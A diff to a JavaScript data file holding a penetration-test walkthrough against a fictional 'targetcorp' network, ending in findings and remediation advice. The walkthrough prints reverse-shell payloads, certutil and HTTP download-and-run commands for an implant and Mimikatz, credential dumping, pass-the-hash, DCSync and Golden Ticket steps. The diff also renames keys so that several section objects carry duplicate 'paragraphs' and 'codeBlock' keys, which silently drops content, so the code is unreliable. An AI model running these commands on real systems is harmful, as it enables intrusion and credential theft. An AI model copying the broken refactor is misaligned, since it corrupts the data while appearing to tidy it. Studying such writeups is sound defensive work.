@@ -13554,10 +13554,10 @@ const writeups = [
     excerpt:
       "A detailed walkthrough of a real-world black-box penetration test against a mid-sized enterprise environment. Starting from a single IP range and zero credentials, we chain together OSINT, external enumeration, initial access, lateral movement, privilege escalation, and full Active Directory compromise — documenting every tool, command, and decision along the way.",
     date: "Apr 2025",
-    readTime: "35 min read",
+    readTime: "25 min read",
     sections: [
       {
-        title: "1. Engagement Scope & Rules of Engagement",
+        heading: "1. Engagement Scope & Rules of Engagement",
         paragraphs: [
           "Every serious penetration test starts before a single packet is sent. The scoping call is where you define what's in and what's out — and getting this wrong can mean the difference between a successful engagement and a lawsuit. For this engagement, the client is a mid-sized financial services company with about 1,200 employees across three offices. They wanted a black-box external test with an assumed breach component: start external, gain initial access however possible, then pivot internally.",
           "The agreed scope included a /24 external IP range (192.0.2.0/24), all subdomains of targetcorp.com, and an internal network range of 10.10.0.0/16 reachable only after establishing a foothold. Out of scope: production databases tagged with a specific VLAN, the CEO's laptop (yes, this gets specified sometimes), and any denial-of-service activity. The testing window was Monday–Friday, 08:00–18:00 IST, with an emergency contact number if we accidentally took something critical offline.",
@@ -13565,7 +13565,7 @@ const writeups = [
         ],
       },
       {
-        title: "2. Passive Reconnaissance — Building the Target Profile",
+        heading: "2. Passive Reconnaissance — Building the Target Profile",
         paragraphs: [
           "Passive recon is where patience pays off. The goal is to map the client's external footprint without touching their infrastructure at all — which means everything we learn comes from public sources. This phase typically yields the most valuable intelligence per hour of work.",
           "We start with the Whois record and DNS history. Tools like SecurityTrails, Shodan, Censys, and OSINT Framework give us a layered picture. We look for historical DNS entries (which often reveal decommissioned but still-live infrastructure), certificate transparency logs (which expose internal hostnames and staging environments), and email headers from publicly available correspondence (which can leak internal IP ranges and mail server details).",
@@ -13593,7 +13593,7 @@ const writeups = [
   wc -l subdomains_final.txt
   # Output: 312 subdomains_final.txt`,
         },
-        paragraphsAfter: [
+        paragraphs: [
           "312 subdomains is a rich attack surface. We now resolve all of them to IPs and separate the in-scope from the out-of-scope. Several interesting patterns emerge: a Jenkins CI instance at ci.targetcorp.com, a Confluence wiki at wiki.targetcorp.com, a staging API at api-staging.targetcorp.com, and — most intriguingly — vpn.targetcorp.com which we'll come back to.",
           "Shodan and Censys enumerate open ports and service banners across the /24 without us sending a single packet from our own IP. We find several hosts running outdated TLS versions, a couple of exposed admin panels, and one particularly interesting host running a Citrix NetScaler with a banner that reveals its exact firmware version.",
         ],
@@ -13603,7 +13603,7 @@ const writeups = [
         },
       },
       {
-        title: "3. Active Reconnaissance — Port Scanning & Service Enumeration",
+        heading: "3. Active Reconnaissance — Port Scanning & Service Enumeration",
         paragraphs: [
           "With the passive picture painted, we move into active recon. This is where we start generating traffic that will appear in the client's logs. We've notified the SOC team that testing has begun (per the RoE), so any alerts they generate are useful feedback, not a problem.",
           "We run nmap in stages. The initial sweep is fast and wide — just finding live hosts and open ports. The second pass is deep and specific — running default scripts and version detection against every open port. We keep the timing conservative (T3) because we don't want to accidentally DoS anything and because slower scans produce more accurate results against rate-limited services.",
@@ -13627,11 +13627,11 @@ const writeups = [
   searchsploit apache 2.4.49
   searchsploit citrix netscaler 13.0`,
         },
-        paragraphsAfter: [
+        paragraphs: [
           "The service scan results are telling. Port 8443 on 192.0.2.47 returns a Citrix ADC (NetScaler) management interface. Version detection confirms it's running 13.0 build 67.39 — a version vulnerable to CVE-2023-3519, the unauthenticated RCE that wrecked a lot of organizations in mid-2023. We note this but don't exploit it yet; we want to exhaust lower-noise options first.",
           "More interestingly, 192.0.2.82 is running Apache Tomcat 9.0.71 on port 8080 with the manager interface exposed at /manager/html. Default credentials are worth a quick check before anything fancy. We'll come back to this during the exploitation phase.",
         ],
-        codeBlock2: {
+        codeBlock: {
           language: "bash",
           code: `# Web application fingerprinting
   whatweb -a 3 https://targetcorp.com | tee whatweb_main.txt
@@ -13651,7 +13651,7 @@ const writeups = [
         },
       },
       {
-        title: "4. OSINT — Human Intelligence & Credential Exposure",
+        heading: "4. OSINT — Human Intelligence & Credential Exposure",
         paragraphs: [
           "Technical enumeration tells you about systems. OSINT tells you about people — and people are almost always the weakest link. LinkedIn, GitHub, Pastebin, HaveIBeenPwned, and breach databases give us a human map of the organization that no port scanner can produce.",
           "We enumerate employees on LinkedIn: job titles, tenure, technology stacks they mention in their profiles, and the email format the company uses (it's always in the first few employee profiles if you know where to look). Here it's firstname.lastname@targetcorp.com. We generate a candidate employee list and run it through LinkedIn's people search, pulling around 340 employee names.",
@@ -13685,7 +13685,7 @@ const writeups = [
     --report-format json \\
     --report-path gitleaks_report.json`,
         },
-        paragraphsAfter: [
+        paragraphs: [
           "TruffleHog surfaces gold: a developer committed an AWS access key to a public GitHub repository 8 months ago. The key has since been revoked, but the repository also contains internal configuration files referencing internal hostnames, VPN gateway addresses, and — in a .env file pushed by mistake — a password pattern the dev team appears to use across multiple services.",
           "h8mail correlates three executive email addresses against a 2022 LinkedIn breach. One appears with a plaintext password. We note the pattern for wordlist building — we won't use it to compromise personal accounts, only to inform our corporate spraying strategy. Dictionary words plus special characters plus a year. Classic.",
         ],
@@ -13695,7 +13695,7 @@ const writeups = [
         },
       },
       {
-        title: "5. Initial Access — Gaining the First Foothold",
+        heading: "5. Initial Access — Gaining the First Foothold",
         paragraphs: [
           "With recon complete, we have several potential entry points: the exposed Tomcat manager, the Citrix NetScaler RCE, a VPN portal that might be vulnerable to credential stuffing, and a web application at app.targetcorp.com with an interesting login form. We prioritize by likelihood of success and noise level — start quiet, escalate only if needed.",
           "We begin with password spraying the VPN portal. We have ~340 valid email addresses and a hypothesis about the password pattern. The key discipline here is spray rate: one attempt per account per 30 minutes stays well under any reasonable lockout policy. Spray too fast and you lock out half the company and light up the SOC. Spray too slow and the engagement window closes.",
@@ -13730,10 +13730,10 @@ const writeups = [
     -m URI:/manager/html \\
     -t 1 -T 1 -f`,
         },
-        paragraphsAfter: [
+        paragraphs: [
           "The Tomcat manager is a hit. Credentials tomcat:s3cr3t! grant access to the Tomcat web application manager. This is textbook: a forgotten development server left internet-facing with default credentials. From here, deploying a malicious WAR file is a three-click operation in the browser or a single curl command.",
         ],
-        codeBlock2: {
+        codeBlock: {
           language: "bash",
           code: `# Generate a reverse shell payload as a WAR file
   msfvenom -p java/jsp_shell_reverse_tcp \\
@@ -13749,10 +13749,10 @@ const writeups = [
   nc -lvnp 4444
   curl http://192.0.2.82:8080/shell/`,
         },
-        paragraphsAfter2: [
+        paragraphs: [
           "We have a shell. It's running as the tomcat service account on a Linux host. The connection isn't particularly stable so we immediately upgrade to a full PTY and then drop a more reliable Meterpreter implant before doing anything else.",
         ],
-        codeBlock3: {
+        codeBlock: {
           language: "bash",
           code: `# Upgrade the basic netcat shell to an interactive PTY
   python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -13775,7 +13775,7 @@ const writeups = [
         },
       },
       {
-        title: "6. Post-Exploitation — Local Enumeration & Privilege Escalation",
+        heading: "6. Post-Exploitation — Local Enumeration & Privilege Escalation",
         paragraphs: [
           "Shell access as the tomcat service account is a start, but it's low-privilege and constrained. Before moving laterally, we need to understand the host: what's running, what credentials are cached, what misconfigurations exist, and whether we can escalate to root.",
           "LinPEAS is our first tool of choice for automated local enumeration. It scans for hundreds of common privilege escalation vectors and produces color-coded output that makes triage fast — red means near-certain PE path, yellow means investigate, green means probably fine. We pipe the output to a file and work through the findings methodically.",
@@ -13802,10 +13802,10 @@ const writeups = [
     /etc/ /var/www/ /opt/ /home/ 2>/dev/null \\
     | grep -v Binary | tee /tmp/cred_grep.txt`,
         },
-        paragraphsAfter: [
+        paragraphs: [
           "LinPEAS surfaces two critical findings. First, the /etc/shadow file is world-readable — a classic misconfiguration that exposes all local password hashes. Second, there's a cron job running as root every 5 minutes that executes /opt/scripts/backup.sh, and that script is writable by the tomcat group. We own the file.",
         ],
-        codeBlock2: {
+        codeBlock: {
           language: "bash",
           code: `# Confirm we can write to the cron script
   ls -la /opt/scripts/backup.sh
@@ -13831,7 +13831,7 @@ const writeups = [
         },
       },
       {
-        title: "7. Pivoting — Moving Into the Internal Network",
+        heading: "7. Pivoting — Moving Into the Internal Network",
         paragraphs: [
           "We now have root on an external-facing Linux server that turns out to be dual-homed: it has both a public interface (192.0.2.82) and an internal interface (10.10.50.12). This is our bridge into the internal network. We set up a SOCKS5 proxy tunnel through this host so all our tools can reach internal assets as if we were sitting on the LAN.",
           "We use Chisel for tunneling because it runs over HTTP/HTTPS (which bypasses most perimeter firewall rules), ships as a single static binary, and is extremely fast to set up. The alternative is SSH dynamic port forwarding, but Chisel's reverse tunnel mode is cleaner when egress filtering is involved.",
@@ -13856,12 +13856,12 @@ const writeups = [
     -p 88,389,445,636,3268,3269,5985,9389 \\
     10.10.1.10 -oN dc_ports.txt`,
         },
-        paragraphsAfter: [
+        paragraphs: [
           "The internal sweep reveals a rich environment: 47 live hosts across the 10.10.0.0/16 range, including what is clearly the domain controller at 10.10.1.10 (Kerberos on 88, LDAP on 389, SMB on 445). There are Windows workstations, a handful of Linux servers, and a VMware vCenter instance at 10.10.2.15. The attack surface just expanded dramatically.",
         ],
       },
       {
-        title: "8. Active Directory Enumeration",
+        heading: "8. Active Directory Enumeration",
         paragraphs: [
           "Active Directory is the backbone of most Windows enterprise environments, and compromising it typically means game over. But first we need working domain credentials to enumerate it properly. We crack the shadow file we grabbed from the web server.",
         ],
@@ -13887,14 +13887,14 @@ const writeups = [
     --zip -c All \\
     -ns 10.10.1.10`,
         },
-        paragraphsAfter: [
+        paragraphs: [
           "The deploy account is a low-privilege domain user, but that's enough to enumerate the entire AD structure. BloodHound ingests the data and renders the graph. Attack paths light up immediately: three Kerberoastable service accounts, a path to Domain Admin through an unconstrained delegation host, and a helpdesk user who is local admin on 23 workstations.",
         ],
         imagePlaceholder: {
           caption: "Fig 4: BloodHound CE mapping Active Directory attack paths — nodes in red are Tier Zero assets (Domain Controllers, krbtgt), edges represent abusable relationships like GenericWrite, AdminTo, and HasSession",
           src: "https://raw.githubusercontent.com/SpecterOps/BloodHound/refs/heads/main/packages/go/ein/testdata/OriginalADCSPKI.png",
         },
-        codeBlock2: {
+        codeBlock: {
           language: "bash",
           code: `# Enumerate AD objects in detail with ldapdomaindump
   proxychains ldapdomaindump \\
@@ -13911,7 +13911,7 @@ const writeups = [
         },
       },
       {
-        title: "9. Kerberoasting — Extracting Service Account Tickets",
+        heading: "9. Kerberoasting — Extracting Service Account Tickets",
         paragraphs: [
           "Kerberoasting is one of the most reliably effective Active Directory attacks, and it's been public knowledge since 2014. The premise: any domain user can request a Kerberos service ticket (TGS) for any account with a registered Service Principal Name. Those tickets are encrypted with the account's NTLM hash, which we can take offline and crack.",
           "BloodHound flagged three Kerberoastable accounts: svc_sql, svc_backup, and svc_mssql. We request all their tickets in a single shot.",
@@ -13940,7 +13940,7 @@ const writeups = [
   # svc_backup:Backup@2023!
   # svc_sql:Sqlserver#1`,
         },
-        paragraphsAfter: [
+        paragraphs: [
           "Two out of three hashes crack in under 20 minutes on a GPU rig. svc_backup and svc_sql both have guessable passwords — dictionary words with a number and a special character, exactly the kind of thing passes a complexity requirement but falls to wordlist + rules. svc_mssql doesn't crack with our wordlist so we move on.",
           "svc_backup is especially interesting: BloodHound shows it has GenericWrite permissions over the helpdesk OU. But there's an even cleaner path available through the SQL server, so we follow that chain.",
         ],
@@ -13950,7 +13950,7 @@ const writeups = [
         },
       },
       {
-        title: "10. Lateral Movement — Spreading Across the Environment",
+        heading: "10. Lateral Movement — Spreading Across the Environment",
         paragraphs: [
           "With svc_sql credentials, we have access to SQL Server instances in the environment. SQL Server is frequently over-privileged in enterprise environments — DBAs add sysadmin 'just in case' and it never gets revoked. We connect directly.",
         ],
@@ -13974,10 +13974,10 @@ const writeups = [
   EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.10.5/implant.exe C:\\Windows\\Temp\\svc.exe';
   EXEC xp_cmdshell 'C:\\Windows\\Temp\\svc.exe';`,
         },
-        paragraphsAfter: [
+        paragraphs: [
           "We now have a shell on the SQL server as svc_sql. We run Mimikatz in-memory to dump cached credentials — carefully, using the PowerShell-based Invoke-Mimikatz to avoid dropping a binary to disk where EDR might catch it.",
         ],
-        codeBlock2: {
+        codeBlock: {
           language: "powershell",
           code: `# In-memory Mimikatz — nothing touches disk
   $uri = "http://10.10.10.5/Invoke-Mimikatz.ps1"
@@ -13993,10 +13993,10 @@ const writeups = [
   # Analyze the dump offline with pypykatz
   proxychains python3 pypykatz lsa minidump lsass.dmp`,
         },
-        paragraphsAfter2: [
+        paragraphs: [
           "The LSASS dump contains an NTLM hash for the IT Administrator account — cached from a previous login to this server. We don't need to crack it. We use it directly in a Pass-the-Hash attack.",
         ],
-        codeBlock3: {
+        codeBlock: {
           language: "bash",
           code: `# Pass-the-Hash — authenticate using the hash directly, no plaintext needed
   proxychains python3 /opt/impacket/examples/psexec.py \\
@@ -14017,7 +14017,7 @@ const writeups = [
         },
       },
       {
-        title: "11. Domain Admin — The Final Escalation",
+        heading: "11. Domain Admin — The Final Escalation",
         paragraphs: [
           "We have local admin on 31 machines, but we need Domain Admin or direct DC access to call full compromise. BloodHound highlighted FILESRV01 as configured with Unconstrained Kerberos Delegation — the most dangerous delegation type.",
           "When Unconstrained Delegation is configured, any user that authenticates to that server has their TGT (master Kerberos ticket) cached in memory there. If we can coerce the Domain Controller itself to authenticate to FILESRV01, we capture the DC's TGT and can impersonate it — enabling a DCSync attack that dumps every password hash in the domain.",
@@ -14048,10 +14048,10 @@ const writeups = [
     TARGETCORP/DC01\\$@DC01.targetcorp.local \\
     -dc-ip 10.10.1.10 -just-dc-user Administrator`,
         },
-        paragraphsAfter: [
+        paragraphs: [
           "DCSync delivers the Domain Administrator's NTLM hash with no LSASS touching, no risky process injection — just a legitimate AD replication request made by what the DC believes is another DC. We have the keys.",
         ],
-        codeBlock2: {
+        codeBlock: {
           language: "bash",
           code: `# Full DCSync — dump every hash in the domain
   proxychains python3 /opt/impacket/examples/secretsdump.py \\
@@ -14075,7 +14075,7 @@ const writeups = [
         },
       },
       {
-        title: "12. Persistence Simulation & Cleanup",
+        heading: "12. Persistence Simulation & Cleanup",
         paragraphs: [
           "In a full red team engagement we'd establish persistence to simulate long-term dwell time. In a pentest, we document what could be deployed and demonstrate one non-destructive example, then clean up thoroughly.",
           "The most resilient persistence in an AD environment is a Golden Ticket: a forged Kerberos TGT signed with the KRBTGT account hash. Golden Tickets survive user password resets, remain valid for 10 years by default, and can be used to generate service tickets for any resource in the domain. The only remediation is resetting the KRBTGT password twice — which invalidates every Kerberos ticket in the domain and causes temporary service disruption.",
@@ -14111,12 +14111,12 @@ const writeups = [
   # Restore backup.sh to original content, kill Chisel tunnel
   kill $(pgrep chisel)`,
         },
-        paragraphsAfter: [
+        paragraphs: [
           "Every artifact gets removed and documented. The client receives a full IOC list: file hashes, C2 addresses, registry keys modified, scheduled tasks added, and a precise timeline of every action taken. Their blue team uses this to verify cleanup and retroactively test their detection stack — figuring out which events they should have caught, and building better rules for next time.",
         ],
       },
       {
-        title: "13. Findings Summary & Severity Ratings",
+        heading: "13. Findings Summary & Severity Ratings",
         paragraphs: [
           "The engagement produced 23 distinct findings. The critical-severity items define the report's narrative: there was a clear, exploitable path from the public internet to full domain compromise, achievable in under a week by an attacker of moderate skill. The key findings are summarized below.",
           "CRITICAL — Exposed Tomcat Manager with Default Credentials (CVSS 9.8): The Apache Tomcat management interface was internet-accessible and protected by default credentials alone. This provided unauthenticated remote code execution within minutes of discovery — the fastest initial access vector in the engagement.",
@@ -14129,7 +14129,7 @@ const writeups = [
         ],
       },
       {
-        title: "14. Remediation Recommendations",
+        heading: "14. Remediation Recommendations",
         paragraphs: [
           "Recommendations are the most important output of the engagement — they're what makes the client more secure. We prioritize by impact and implementation effort so they can triage intelligently rather than trying to fix everything at once.",
           "Immediate (0–2 weeks): Take the Tomcat manager interface off the internet or restrict it by IP with strong authentication. Audit and rotate all default credentials across every service. Convert Kerberoastable service accounts to Group Managed Service Accounts (gMSA) — the password becomes a 240-character random string managed automatically by AD, and Kerberoasting becomes computationally infeasible. Remove Unconstrained Delegation from FILESRV01; replace with Resource-Based Constrained Delegation scoped to only the services that genuinely require it.",
@@ -14161,7 +14161,7 @@ const writeups = [
         },
       },
       {
-        title: "15. Lessons Learned & Reflections",
+        heading: "15. Lessons Learned & Reflections",
         paragraphs: [
           "Every engagement teaches you something. This one reinforced patterns I keep seeing across organizations of all sizes and industries — patterns that suggest certain categories of vulnerability are structural, not accidental.",
           "Default credentials are still a scourge in 2025. The Tomcat manager was the fastest win of the entire engagement — less than 10 minutes from identifying the service to having a shell. Organizations spend millions on next-gen EDR and zero-trust architecture while leaving admin interfaces exposed to the internet with passwords that ship in the box. The expensive controls don't matter if the basics aren't covered.",
